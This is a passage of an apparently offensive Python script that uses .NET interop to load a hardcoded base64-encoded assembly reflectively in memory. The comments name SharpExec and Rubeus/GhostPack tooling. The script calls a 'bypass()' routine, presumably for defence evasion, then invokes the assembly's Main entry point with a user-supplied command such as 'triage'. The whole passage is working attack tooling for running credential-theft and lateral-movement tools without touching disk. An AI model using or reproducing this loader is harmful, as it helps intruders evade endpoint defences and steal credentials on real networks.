    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpExec.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()